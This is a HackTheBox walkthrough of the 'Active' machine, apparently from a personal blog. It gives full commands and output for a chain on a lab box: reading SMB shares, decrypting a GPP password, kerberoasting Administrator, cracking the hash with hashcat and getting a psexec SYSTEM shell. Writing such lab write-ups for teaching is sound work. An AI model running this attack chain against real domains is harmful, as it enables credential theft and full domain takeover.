---
layout: article
title: "Active - HackTheBox Writeup"
date: "2024-10-16"
image: "/assets/img/active/thumbnail.png"
tags: ["active directory", "linux"]
---

Active is a box in HackTheBox that features group policies and kerberoasting to gain full access to an Active Directory environment.

Throughout AD machines, I reference [this brilliant mind map][AD-Mindmap] to make enumeration a systematic and organized approach.

<div class="article-image">
  <img src="/assets/img/active/admindmap.png">
  <p>Orange Cyberdefense Mind map</p>
</div>

<div class="article-image">
  <img src="/assets/img/active/scan_network_mindmap.png">
  <p>Mind map close up</p>
</div>

First step is to port scan the machine. `-sV` for versioning scanning, and `-sC` for script scanning.

<div class="article-code">
{% highlight sh %}
jeanp@~$ nmap -sVC 10.10.10.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 10:46 CDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.049s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-15 15:46:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
...
{% endhighlight %}
</div>

Since we get ports 53 for DNS, 88 for Kerberos, 389 for LDAP, and 445 for SMB, this indicates that we port scanned a domain controller. Additionally, makes a guess of the OS to be Windows Server 2008.

Getting the IP address of a domain controller is valuable information since its network shares can contain critical information.

<div class="article-image">
  <img src="/assets/img/active/guest_access_smb.png">
</div>

Let's try listing guest access shares this domain controller exposes. The mind map shows commands with `enum4linux`, but this is a deprecated tool that majority of pentesters avoid. Instead we can either use `smbclient` with `-L` for listing, or use `smbmap` with `-H` for the host. I will use the latter.

<div class="article-code">
{% highlight sh %}
jeanp@~$ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections 
{% endhighlight %}
</div>

As expected, we see the default shares for a domain controller: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`.

The only share with read rights is called `Replication`. The name may imply that this is a replication of the entire DC file system.

We can access and read with `smbclient`.

<div class="article-code">
{% highlight sh %}
jeanp@~$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\jeanp]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
{% endhighlight %}
</div>

Navigate the share to find beneficial data.

<div class="article-code">
{% highlight sh %}
jeanp@~$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\jeanp]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

		5217023 blocks of size 4096. 278582 blocks available
smb: \> cd active.htb\
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
  Policies                            D        0  Sat Jul 21 05:37:44 2018
  scripts                             D        0  Wed Jul 18 13:48:57 2018

		5217023 blocks of size 4096. 278582 blocks available
smb: \active.htb\>
{% endhighlight %}
</div>

Policy settings and configs are crucial for management, and can certainly contain sensitive information.

Let's recursively download the entire Policies directory to grep for keywords.

<div class="article-code">
{% highlight sh %}
smb: \active.htb\> recurse
smb: \active.htb\> prompt
smb: \active.htb\> mget Policies
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (13.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
...
smb: \active.htb\> 
{% endhighlight %}
</div>

Before running `mget` to download, we must turn on recursive downloads with `recursion`, and to avoid confirmation messages for every file use `prompt`.

<div class="article-code">
{% highlight sh %}
jeanp@~$ cd Policies 
                                                                                                                                                 
jeanp@~/Policies$ ls
{31B2F340-016D-11D2-945F-00C04FB984F9}  {6AC1786C-016F-11D2-945F-00C04fB984F9}
                                                                                                                                                 
jeanp@~/Policies$ grep -r "password"  
{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
{% endhighlight %}
</div>

With the `Policies` folder downloaded, I `cd` into it, and `grep` recursively for `"password"`. Within `Groups.xml` the GPP encrypted password for the user `SVC_TGS` is displayed.

In 2008, Windows introduced Group Policy Preferences (GPP) which allowed administrators to modify users and groups across their network. The passwords were encrypted with AES-256 and stored in the `Groups.xml` file. However, [Microsoft published the AES key in 2012][AES-Key], meaning that GPP passwords are now trivial to crack.

We can decrypt the password using [gpp-decrypt][gpp-decrypt].

<div class="article-code">
{% highlight sh %}
jeanp@~$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
{% endhighlight %}
</div>

With the password for the user `SVC_TGS` in our possession, we can now list shares with the set of credentials.

It's important to note that we do not have any IP addresses or the computers the user `SVC_TGS` is a member of. All we know is this user's set of credentials. With these credentials we can `smbmap` the DC network shares again to check for different privileges.

So let's run the same `smbmap` command we executed previously, but this time, add `-u` for user and `-p` for password.

<div class="article-code">
{% highlight sh %}
jeanp@~$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100

Detected 1 hosts serving SMB

Established 1 SMB connections(s) and 1 authenticated session(s)                                                                              
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
Closed 1 connections
{% endhighlight %}
</div>

We get read only access to `NETLOGON`, `Replication`, `SYSVOL`, and `Users`. Since we are in the look out for the user.txt flag, let's enter the `Users` directory and investigate.

Use `smbclient` with `-U`, and once prompted, enter the password.

<div class="article-image">
  <img src="/assets/img/active/authenticated_smb_dir.png">
</div>

Let's download all the files for `SVC_TGS` and execute a `find` command for `user.txt`.

<div class="article-image">
  <img src="/assets/img/active/usertxt.png">
</div>

To escalate our privileges we must find a path to a domain admin.

<div class="article-image">
  <img src="/assets/img/active/bloodhound_mindmap.png">
</div>

The mind map shows that since we now have valid credentials, we can launch Bloodhound to gather all domain data through LDAP.

Let's run the first command shown but with an additional argument.

<div class="article-code">
{% highlight sh%}
jeanp@~/BloodhoundData$ bloodhound-python -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -gc active.htb -ns 10.10.10.100 -c all
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno 110] Connection timed out
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 10S
                                                                                                                                                 
jeanp@~/BloodhoundData$ ls
20241017115629_computers.json   20241017115629_domains.json  20241017115629_groups.json  20241017115629_users.json
20241017115629_containers.json  20241017115629_gpos.json     20241017115629_ous.json
{% endhighlight %}
</div>

Notice at the end of the command we add `-ns` as argument. This must be done to use the DNS service of the domain controller for the `active.htb` domain and correctly reach the hosts across the environment. At the end, I use `ls` to show all the JSON files gathered.

The mind map shows that with credentials we can try to find kerberoastable users.

[Kerberoasting][Kerberoasting] at a high level works as follows:

- Hacker hijacks a user account.
- Hacker looks for service accounts (service accounts have Service Principal Names (SPNs)).
- Hacker uses the hijacked domain account to request service tickets for their targeted service.
- Hacker decrypts the stolen tickets to retrieve the service account password.

Let's launch Bloodhound and see if this is indeed a viable option.

Start `neo4j` database.

<div class="article-code">
{% highlight sh%}
jeanp@~$ sudo neo4j start             
{% endhighlight %}
</div>

Start Bloodhound.

<div class="article-code">
{% highlight sh%}
jeanp@~$ bloodhound
{% endhighlight %}
</div>

Upload the JSON files to Bloodhound.

<div class="article-image">
  <img src="/assets/img/active/data_upload_bloodhound.png">
</div>

Refresh database stats.

<div class="article-image">
  <img src="/assets/img/active/database_info.png">
</div>

Now let's look for kerberoastable users using the pre-built analytics queries bloodhound offers.

<div class="article-image">
  <img src="/assets/img/active/shortest_path.png">
</div>

By selecting the `Shortest Paths from Kerberoastable Users` query we can see the path to domain admin through the kerberoastable user `Administrator`.

<div class="article-image">
  <img src="/assets/img/active/kerberoasting.png">
</div>

I'm going to use impacket's version of GetUserSPNs.

<div class="article-code">
{% highlight sh%}
impacket-GetUserSPNs -request-user Administrator -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
{% endhighlight %}
</div>

<div class="article-code">
{% highlight sh%}
jeanp@~$ impacket-GetUserSPNs -request-user Administrator -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2024-10-15 10:45:53.577372             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ca572edd994c49bac1b4e98c3744b8...
{% endhighlight %}
</div>

Save this hash to a file. I'm going to name the file `administrator.hash`.

<div class="article-image">
  <img src="/assets/img/active/admin_hash.png">
</div>

Pass the hash to hashcat.

First, find the mode using [hashcat's website mode catalog][Hashcat-Catalog]. The initial section of the returned hash is the hash mode we must use. In this case, it is `krb5tgs`.

<div class="article-image">
  <img src="/assets/img/active/hash_mode_website.png">
</div>

The hash mode number is `13100`.

Now craft your hashcat command.

<div class="article-code">
{% highlight sh%}
sudo hashcat -m 13100 administrator.hash /usr/share/wordlists/rockyou.txt -o cracked_hash
{% endhighlight %}
</div>


<div class="article-code">
{% highlight sh%}
jeanp@~$ sudo hashcat -m 13100 administrator.hash /usr/share/wordlists/rockyou.txt -o cracked_hash
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...a91318
...
{% endhighlight %}
</div>

Our output file `cracked_hash` shows the cracked password `Ticketmaster1968`.

With the Administrator password in our hands use `impacket` with `ps-exec` to get a remote shell into the Domain Controller with admin privileges.

<div class="article-code">
{% highlight sh%}
jeanp@~$ impacket-psexec Administrator@10.10.10.100                                                                        
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
Requesting shares on 10.10.10.100.....
Found writable share ADMIN$
Uploading file sCzWMDzA.exe
Opening SVCManager on 10.10.10.100.....
Creating service nGaT on 10.10.10.100.....
Starting service nGaT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami 
nt authority\system
{% endhighlight %}
</div>

The root flag will be at `C:\Users\Administrator\Desktop`.

<div class="article-image">
  <img src="/assets/img/active/roottxt.png">
</div>

[gpp-decrypt]: https://www.kali.org/tools/gpp-decrypt/

[AES-Key]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

[AD-Mindmap]: https://raw.githubusercontent.com/Orange-Cyberdefense/ocd-mindmaps/main/img/pentest_ad_dark_2023_02.svg

[Kerberoasting]: https://www.ibm.com/topics/kerberoasting#:~:text=Kerberoasting%20is%20a%20cyberattack%20that,data%2C%20spread%20malware%20and%20more. 

[Hashcat-Catalog]: https://hashcat.net/wiki/doku.php?id=example_hashes



  


































